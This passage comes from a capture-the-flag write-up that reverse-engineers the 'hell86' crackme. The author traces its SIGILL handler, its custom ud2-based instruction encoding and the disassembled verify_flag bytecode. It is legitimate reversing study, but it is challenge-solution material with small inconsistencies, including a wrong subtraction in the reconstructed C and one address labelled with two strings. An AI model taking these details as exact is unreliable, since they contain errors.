    │           0x00000fd2      ba01000000     mov edx, 1
    │       ╭─&amp;lt; 0x00000fd7      744f           je 0x1028
    │       │   0x00000fd9      e887090000     call register_sigill
    │       │   0x00000fde      84c0           test al, al
    │       │   0x00000fe0      ba02000000     mov edx, 2
    │      ╭──&amp;lt; 0x00000fe5      7441           je 0x1028
    │      ││   0x00000fe7      4863fb         movsxd rdi, ebx
    │      ││   0x00000fea      4889ee         mov rsi, rbp
    │      ││   0x00000fed      e89e010000     call verify_flag
    │      ││   0x00000ff2      4883f801       cmp rax, 1
    │      ││   0x00000ff6      488d3dda1000.  lea rdi, str.Wrong          ; 0x20d7 ; &amp;quot;Wrong&amp;quot;
    │     ╭───&amp;lt; 0x00000ffd      7422           je 0x1021
    │     │││   0x00000fff      4883f802       cmp rax, 2
    │     │││   0x00001003      488d3dd31000.  lea rdi, str.hell86_crackme__    ; 0x20dd
    │    ╭────&amp;lt; 0x0000100a      7415           je 0x1021
    │    ││││   0x0000100c      4885c0         test rax, rax
    │    ││││   0x0000100f      488d3dbd1000.  lea rdi, [0x000020d3]       ; &amp;quot;OK!&amp;quot;
    │    ││││   0x00001016      488d05021100.  lea rax, str.You_have__a_bug ; 0x211f ; &amp;quot;You have encountered a bug&amp;quot;
    │    ││││   0x0000101d      480f45f8       cmovne rdi, rax
    │    ││││   ; CODE XREFS from main (0xffd, 0x100a)
    │    ╰╰───&amp;gt; 0x00001021      e80affffff     call sym.imp.puts           ; int puts(const char *s)
    │      ││   0x00001026      31d2           xor edx, edx
    │      ││   ; CODE XREFS from main (0xfd7, 0xfe5)
    │      ╰╰─&amp;gt; 0x00001028      89d0           mov eax, edx
    │           0x0000102a      5a             pop rdx
    │           0x0000102b      5b             pop rbx
    │           0x0000102c      5d             pop rbp
    ╰           0x0000102d      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;make_alt_stack&lt;/strong&gt; allocates 8192 bytes from the heap which will be used as a stack for the signal handler which has been registered with &lt;strong&gt;SA_ONSTACK&lt;/strong&gt; (&lt;strong&gt;sigaltstack&lt;/strong&gt; syscall)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    [0x00000fc0]&amp;gt; pdf @register_sigill
    ╭ (fcn) register_sigill 97
    │   register_sigill ();
    │           ; var int local_8h @ rsp+0x8
    │           ; var int local_10h @ rsp+0x10
    │           ; var int local_90h @ rsp+0x90
    │           ; CALL XREF from main (0xfd9)
    │           0x00001965      53             push rbx
    │           0x00001966      31c0           xor eax, eax
    │           0x00001968      b926000000     mov ecx, 0x26
    │           0x0000196d      4881eca00000.  sub rsp, 0xa0
    │           0x00001974      488d7c2408     lea rdi, [local_8h]
    │           0x00001979      f3ab           rep stosd dword [rdi], eax
    │           0x0000197b      488d05c4ffff.  lea rax, [0x00001946]    ; SIGILL handler
    │           0x00001982      488d7c2410     lea rdi, [local_10h]
    │           0x00001987      c78424900000.  mov dword [local_90h], 0x8000004 ; SA_ONSTACK | SA_SIGINFO
    │           0x00001992      4889442408     mov qword [local_8h], rax
    │           0x00001997      e8c4f5ffff     call sym.imp.sigfillset
    │           0x0000199c      31d2           xor edx, edx
    │           0x0000199e      85c0           test eax, eax
    │       ╭─&amp;lt; 0x000019a0      7519           jne 0x19bb
    │       │   0x000019a2      488d5c2408     lea rbx, [local_8h]
    │       │   0x000019a7      31d2           xor edx, edx
    │       │   0x000019a9      bf04000000     mov edi, SIGILL
    │       │   0x000019ae      4889de         mov rsi, rbx
    │       │   0x000019b1      e8daf5ffff     call sym.imp.sigaction
    │       │   0x000019b6      85c0           test eax, eax
    │       │   0x000019b8      0f94c2         sete dl
    │       │   ; CODE XREF from register_sigill (0x19a0)
    │       ╰─&amp;gt; 0x000019bb      4881c4a00000.  add rsp, 0xa0
    │           0x000019c2      88d0           mov al, dl
    │           0x000019c4      5b             pop rbx
    ╰           0x000019c5      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;register_sigill&lt;/strong&gt; registers a SIGILL handler using the flags &lt;strong&gt;SA_ONSTACK&lt;/strong&gt; and &lt;strong&gt;SA_SIGINFO&lt;/strong&gt;. So when the handler gets called, the alternate stack is used. And the handler has the following signature&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;handler&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; sig, siginfo_t *info, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; *ucontext);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s try to disassemble &lt;strong&gt;verify_flag&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    [0x00000fc0]&amp;gt; pd 10 @ verify_flag
    ╭ (fcn) verify_flag 115
    │   verify_flag ();
    │           ; CALL XREF from main (0xfed)
    │           0x00001190      0f0b           ud2
    │           0x00001192      0200           add al, byte [rax]
    │           0x00001194      0000           add byte [rax], al
    │           0x00001196      0000           add byte [rax], al
    │           0x00001198      0000           add byte [rax], al
    │           0x0000119a      090d00000f0b   or dword [0x0b0f11a0], ecx
    │           0x000011a0      0200           add al, byte [rax]
    │           0x000011a2      0000           add byte [rax], al
    │           0x000011a4      0000           add byte [rax], al
    │           0x000011a6      0000           add byte [rax], al
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;Woah! That&amp;rsquo;s garbage ! How does the flag gets verified ??&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Well, the first instruction is &lt;strong&gt;ud2&lt;/strong&gt;. This generates an Invalid Opcode Exception, ie., it triggers &lt;strong&gt;SIGILL&lt;/strong&gt;.&lt;br&gt;
Let&amp;rsquo;s dive into the sigill_handler routine.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    [0x00000fc0]&amp;gt; pd 6 @0x1946
                ; DATA XREF from register_sigill (0x197b)
                0x00001946      488b82a80000.  mov rax, qword [rdx + 0xa8] ; gp_regs.rip
                0x0000194d      488d7228       lea rsi, [rdx + 0x28]       ; &amp;amp; ucontext-&amp;gt;gp_regs
                0x00001951      488d7802       lea rdi, [rax + 2]
                0x00001955      4883c00e       add rax, 0xe
                0x00001959      488982a80000.  mov qword [rdx + 0xa8], rax
            ╭─&amp;lt; 0x00001960      e97b050000     jmp 0x1ee0
    [0x00000fc0]&amp;gt; pd 3 @0x1ee0
                ; CODE XREF from verify_flag (+0x7d0)
                0x00001ee0      0fb65708       movzx edx, byte [rdi + 8]
                0x00001ee4      488d05951120.  lea rax, [0x00203080]
                0x00001eeb      ff24d0         jmp qword [rax + rdx*8]
    [0x00000fc0]&amp;gt; px/4xg @0x203080
    0x00203080  0x0000000000001a1f  0x0000000000001a20
    0x00203090  0x0000000000001a39  0x0000000000001a52
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The handler increments the instruction pointer by 14 bytes and jumps to the instruction specified by the index &lt;strong&gt;[rdi+8]&lt;/strong&gt;. The array at 0x203080 contains addresses of routines for emulating instructions.&lt;br&gt;
For example the routine at 0x1a20 has&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    [0x00000fc0]&amp;gt; pd 7 @0x1a20
                0x00001a20      0fb64f0a       movzx ecx, byte [rdi + 0xa]
                0x00001a24      0fb6470b       movzx eax, byte [rdi + 0xb]
                0x00001a28      0fb65709       movzx edx, byte [rdi + 9]
                0x00001a2c      488b04c6       mov rax, qword [rsi + rax*8]
                0x00001a30      480304ce       add rax, qword [rsi + rcx*8]
                0x00001a34      488904d6       mov qword [rsi + rdx*8], rax
                0x00001a38      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;rsi&lt;/strong&gt; stores the base address of the array of GPRs in the &lt;strong&gt;ucontext&lt;/strong&gt;. So, this routine adds registers (indexed by &lt;strong&gt;rdi&lt;/strong&gt;).&lt;br&gt;
Recall that &lt;strong&gt;rip&lt;/strong&gt; is incremented by 14 bytes. Those 14 bytes are used to store the information for each instruction. Each of the 14 byte block starts with a &lt;strong&gt;ud2&lt;/strong&gt;.&lt;br&gt;
So we have,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; insn_t
    {
        int16_t ud2_op;         &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// marks the beginning of instruction. rip points here
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; __unknown[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;];      &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// rdi points here. rdi = rip+2
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        uint8_t instr;          &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// instruction index
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        uint8_t dest;           &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// destination register
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        uint8_t src_regs[&lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt;];    &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// source registers
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We need to figure out the &amp;lsquo;__unknown&amp;rsquo; member and the order of the source registers.&lt;br&gt;
Let&amp;rsquo;s move to the next routine at &lt;strong&gt;0x1a39&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    [0x00000fc0]&amp;gt; pd 7 @0x1a39
                0x00001a39      0fb6470a       movzx eax, byte [rdi + 0xa]  ; src1
                0x00001a3d      0fb64f0b       movzx ecx, byte [rdi + 0xb]  ; src2
                0x00001a41      0fb65709       movzx edx, byte [rdi + 9]    ; dst
                0x00001a45      488b04c6       mov rax, qword [rsi + rax*8]
                0x00001a49      482b04ce       sub rax, qword [rsi + rcx*8]
                0x00001a4d      488904d6       mov qword [rsi + rdx*8], rax ; dst = src1-src2
                0x00001a51      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! Now we get the order of the source registers. Let&amp;rsquo;s rewrite the instruction struct&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; insn_t
    {
        int16_t ud2_op;     &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// marks the beginning of instruction. rip points here
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; __unknown[&lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt;];  &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// rdi points here. rdi = rip+2
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        uint8_t instr;      &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// instruction index
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        uint8_t dest;       &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// destination register
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        uint8_t src1;       &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// source register 1
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        uint8_t src2;       &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// source register 2
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s move to the function at &lt;strong&gt;0x1ada&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    [0x00000fc0]&amp;gt; pd 7 @0x1ada
                0x00001ada      0fb64709       movzx eax, byte [rdi + 9]    ; dst
                0x00001ade      488b17         mov rdx, qword [rdi]         ; __unknown
                0x00001ae1      488914c6       mov qword [rsi + rax*8], rdx
                0x00001ae5      c3             ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cool ! this copies &lt;strong&gt;__unknown&lt;/strong&gt; to the dest register. So, this is emulates move immediate.&lt;br&gt;
Great ! now we have figured out the __unknown&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; insn_t
    {
        int16_t ud2_op;     &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// marks the beginning of instruction. rip points here
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        int64_t imm;        &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// immediate value
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        uint8_t instr;      &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// instruction index
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        uint8_t dest;       &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// destination register
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        uint8_t src1;       &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// source register 1
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;        uint8_t src2;       &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// source register 2
&lt;/span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;    };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I&amp;rsquo;ve renamed the functions at &lt;strong&gt;0x203080&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    .data:0000000000203080 off_203080      dq offset nullsub_2
    .data:0000000000203088                 dq offset add
    .data:0000000000203090                 dq offset sub
    .data:0000000000203098                 dq offset mul
    .data:00000000002030A0                 dq offset quot
    .data:00000000002030A8                 dq offset rem
    .data:00000000002030B0                 dq offset sar
    .data:00000000002030B8                 dq offset shl
    .data:00000000002030C0                 dq offset neg
    .data:00000000002030C8                 dq offset mov_imm
    .data:00000000002030D0                 dq offset movzx_byte_reg_imm
    .data:00000000002030D8                 dq offset movsx_byte_reg_imm
    .data:00000000002030E0                 dq offset movzx_word_reg_imm
    .data:00000000002030E8                 dq offset movsx_word_reg_imm
    .data:00000000002030F0                 dq offset mov_dword_reg_imm
    .data:00000000002030F8                 dq offset movsx_dword_reg_imm
    .data:0000000000203100                 dq offset mov_reg_qmem
    .data:0000000000203108                 dq offset mov_mem_byte
    .data:0000000000203110                 dq offset mov_mem_word
    .data:0000000000203118                 dq offset mov_mem_dword
    .data:0000000000203120                 dq offset mov_mem_qword
    .data:0000000000203128                 dq offset push_reg
    .data:0000000000203130                 dq offset push_imm
    .data:0000000000203138                 dq offset pop_reg
    .data:0000000000203140                 dq offset mov_reg_reg
    .data:0000000000203148                 dq offset or
    .data:0000000000203150                 dq offset and
    .data:0000000000203158                 dq offset xor
    .data:0000000000203160                 dq offset not
    .data:0000000000203168                 dq offset cmp_lt
    .data:0000000000203170                 dq offset cmp_le
    .data:0000000000203178                 dq offset cmp_gt
    .data:0000000000203180                 dq offset cmp_ge
    .data:0000000000203188                 dq offset cmp_eq
    .data:0000000000203190                 dq offset cmp_neq
    .data:0000000000203198                 dq offset cmp_eq_imm
    .data:00000000002031A0                 dq offset cmp_neq_imm
    .data:00000000002031A8                 dq offset cmp_reg_zero
    .data:00000000002031B0                 dq offset jmp_imm_if_zero
    .data:00000000002031B8                 dq offset jmp_imm_if_notzero
    .data:00000000002031C0                 dq offset call_imm
    .data:00000000002031C8                 dq offset ret
    .data:00000000002031D0                 dq offset ret_if_reg_not_zero
    .data:00000000002031D8                 dq offset ret_if_reg_zero
    .data:00000000002031E0                 dq offset lea_reg_imm
    .data:00000000002031E8                 dq offset sar_imm
    .data:00000000002031F0                 dq offset shl_imm
    .data:00000000002031F8                 dq offset or_imm
    .data:0000000000203200                 dq offset and_imm
    .data:0000000000203208                 dd offset xor_imm
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So, the verify_flag routine is an array of &lt;strong&gt;insn_t&lt;/strong&gt;. The flag is verified by emulating the instructions through a &lt;strong&gt;SIGILL&lt;/strong&gt;. Now we need to write a disassembler for &lt;strong&gt;verify_flag&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Here&amp;rsquo;s the disassembly of &lt;code&gt;verify_flag&lt;/code&gt;. I&amp;rsquo;ve defined some new instructions like&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Instruction&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;Syntax&lt;/th&gt;
&lt;th style=&#34;text-align:left&#34;&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ret.z&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;ret.z reg&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;returns if &lt;em&gt;reg&lt;/em&gt; is zero&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ret.nz&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;ret.nz reg&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;returns if &lt;em&gt;reg&lt;/em&gt; is non zero&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;if.z&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;if.z reg, jmp offset&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;if &lt;em&gt;reg&lt;/em&gt; is zero, goto &lt;em&gt;offset&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;if.nz&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;if.nz reg, jmp offset&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;if &lt;em&gt;reg&lt;/em&gt; is not zero, goto &lt;em&gt;offset&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;cmp.cc&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;cmp.cc Rd, Rs, Rt&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;compare registers &lt;em&gt;Rs&lt;/em&gt; and &lt;em&gt;Rt&lt;/em&gt; and set the result of condition &lt;em&gt;cc&lt;/em&gt; into &lt;em&gt;Rd&lt;/em&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;div.quot&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;div.quot Rd, Rs, Rt&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Rd = ⌊Rs/Rt⌋&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;div.rem&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;div.rem Rd, Rs, Rt&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;Rd = Rs mod Rt&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;pre&gt;&lt;code class=&#34;language-x86asm&#34; data-lang=&#34;x86asm&#34;&gt;    00000000          mov rax, 0x2
    00000001          cmp.neq r8, rdi, 0x2      ; argc must be 2
    00000002          ret.nz r8
    00000003          lea rsi, [rsi + 0x8]
    00000004          mov rdi, qword [rsi + 0]  ; argv[1]
    00000005          jmp 0x6

    00000006          push rbp
    00000007          mov rbp, rsp
    00000008          lea rsp, [rsp + 0xfffffff0]
    00000009          mov qword [rbp + 0xfffffff0], rdi
    0000000a          call 0x73                 ; find length
    0000000b          cmp.neq rax, rax, 0x24    ; len(argv[1]) == 0x24
    0000000c          if.nz rax, jmp 0x29
    0000000d          mov rdi, 0x20cd           ; &amp;quot;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+&amp;quot;
    0000000e          call 0x73
    0000000f          mov qword [rbp + 0xfffffff8], rax
    00000010          mov rdi, qword [rbp + 0xfffffff0]
    00000011          mov rsi, 0x20cd           ; &amp;quot;FLAG{&amp;quot;
    00000012          mov rdx, rax
    00000013          call 0x79                 ; compare strings
    00000014          if.nz rax, jmp 0x29
    00000015          mov rdi, qword [rbp + 0xfffffff0]
    00000016          movzx rsi, byte [rdi + 0x23]
    00000017          cmp.neq rsi, rsi, 0x7d    ; input[0x23] == &#39;}&#39;
    00000018          if.nz rsi, jmp 0x29
    00000019          mov rsi, qword [rbp + 0xfffffff8]
    0000001a          add rdi, rdi, rsi         ; rdi += len(&amp;quot;FLAG{&amp;quot;)
    0000001b          neg rsi, rsi
    0000001c          lea rsi, [rsi + 0x23]     ; rsi = 0x23-5 = 0x1e
    0000001d          push rsi
    0000001e          call 0x2d                 ; compute indices
    0000001f          pop rsi
    00000020          if.z rax, jmp 0x29
    00000021          mov rdi, rax
    00000022          push rdi                  ; array of indices
    00000023          call 0x51                 ; validate the flag
    00000024          pop rdi
    00000025          push rax
    00000026          call [free]
    00000027          pop rax
    00000028          jmp 0x2a                  ; good jump
    00000029          mov rax, 0x1              ; bad jump
    0000002a          mov rsp, rbp
    0000002b          pop rbp
    0000002c          ret

    0000002d          mov rax, 0
    0000002e          ret.z rsi
    0000002f          push rdi                  ; string
    00000030          push rsi                  ; len
    00000031          shl rdi, rsi, 0x3
    00000032          call [malloc]             ; allocate len*8 bytes
    00000033          pop rsi
    00000034          pop rdi
    00000035          ret.z rax                 ; return 0 if malloc failed
    00000036          mov r8, rax
    00000037          mov r9, rax
    00000038          push r9
    00000039          push r8
    0000003a          push rdi
    0000003b          push rsi
    0000003c          movzx rsi, byte [rdi + 0] ; char
    0000003d          mov rdi, 0x20a0           ; &amp;quot;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+&amp;quot;
    0000003e          call 0x84                 ; strchr
    0000003f          pop rsi
    00000040          pop rdi
    00000041          pop r8
    00000042          pop r9
    00000043          if.z rax, jmp 0x4d
    00000044          mov r10, 0x20a0
    00000045          sub rax, rax, r10         ; index of char
    00000046          mov qword [r9 + 0], rax   ; store index
    00000047          lea r9, [r9 + 0x8]
    00000048          lea rdi, [rdi + 0x1]      ; next char
    00000049          lea rsi, [rsi + 0xffffffff]
    0000004a          if.nz rsi, jmp 0x38
    0000004b          mov rax, r8               ; return array of indices
    0000004c          ret

    0000004d          mov rdi, r8
    0000004e          call [free]
    0000004f          mov rax, 0
    00000050          ret

    00000051          mov rax, 0x1
    00000052          ret.z rsi
    00000053          mov r8, qword [rdi + 0]
    00000054          cmp.neq r8, r8, 0x16      ; the first index is 0x16
    00000055          ret.nz r8
    00000056          push rdi                  ; indices array
    00000057          push rsi                  ; no.of elements
    00000058          call 0x66                 ; some transformation applied
    00000059          pop rsi
    0000005a          pop rdi
    0000005b          lea rsi, [rsi + 0xffffffff]
    0000005c          push rdi                  ; transformed array
    0000005d          shl rdx, rsi, 0x3         ; #bytes = #qwords * 8
    0000005e          mov rsi, 0x1fa0           ; magic array
    0000005f          call 0x79                 ; compare arrays
    00000060          pop rdi
    00000061          mov r8, rax               ; must return 0
    00000062          mov rax, 0x1
    00000063          ret.nz r8
    00000064          mov rax, 0
    00000065          ret

    00000066          ret.z rsi                 ; the transformation
    00000067          lea rsi, [rsi + 0xffffffff]
    00000068          ret.z rsi
    00000069          mov r8, qword [rdi + 0]
    0000006a          mov r9, qword [rdi + 0x8]
    0000006b          sub r8, r9, r8            ; rdi[1]-rdi[0]
    0000006c          xor r8, r8, rsi           ; rsi ^ rdi[1]-rdi[0]
    0000006d          mul r9, r8, r8
    0000006e          mul r8, r9, r8            ; r8 = (rsi ^ rdi[1]-rdi[0])**3
    0000006f          mov qword [rdi + 0], r8
    00000070          lea rdi, [rdi + 0x8]
    00000071          lea rsi, [rsi + 0xffffffff]
    00000072          jmp 0x68

    00000073          mov rax, 0
    00000074          movzx r10, byte [rdi + 0]
    00000075          ret.z r10
    00000076          lea rdi, [rdi + 0x1]
    00000077          lea rax, [rax + 0x1]
    00000078          jmp 0x74

    00000079          mov rax, 0
    0000007a          ret.z rdx
    0000007b          movzx r8, byte [rdi + 0]
    0000007c          movzx r9, byte [rsi + 0]
    0000007d          xor r8, r8, r9
    0000007e          or rax, rax, r8
    0000007f          lea rdx, [rdx + 0xffffffff]
    00000080          lea rdi, [rdi + 0x1]
    00000081          lea rsi, [rsi + 0x1]
    00000082          if.nz rdx, jmp 0x7b
    00000083          ret

    00000084          mov rax, rdi
    00000085          movzx r8, byte [rax + 0]
    00000086          if.z r8, jmp 0x8b
    00000087          cmp.eq r8, r8, rsi
    00000088          ret.nz r8
    00000089          lea rax, [rax + 0x1]
    0000008a          jmp 0x85
    0000008b          mov rax, 0
    0000008c          ret
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now let&amp;rsquo;s analyze the disassembled code.&lt;br&gt;
The routine at &lt;strong&gt;0x73&lt;/strong&gt; finds the length of the string pointed to by &lt;strong&gt;rdi&lt;/strong&gt;.&lt;br&gt;
&lt;strong&gt;0x79&lt;/strong&gt; compares byte arrays for equality. It xor&amp;rsquo;s the respective bytes and performs a bitwise-or of the xor&amp;rsquo;s. If the strings are equal then the result will be zero.&lt;br&gt;
The routine at 0x2d is like this&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;    &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt;* &lt;span style=&#34;color:#447fcf&#34;&gt;get_indices&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt;* buf, &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; size)
    {
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt;* words = (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;long&lt;/span&gt;*) malloc(size &amp;lt;&amp;lt; &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt;);
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;char&lt;/span&gt; set[] = &lt;span style=&#34;color:#ed9d13&#34;&gt;&amp;#34;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+&amp;#34;&lt;/span&gt;;
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;; i &amp;lt; size; ++i) {
            words[i] = strchr(set, buf[i])-buf;
        }
        &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;return&lt;/span&gt; words;
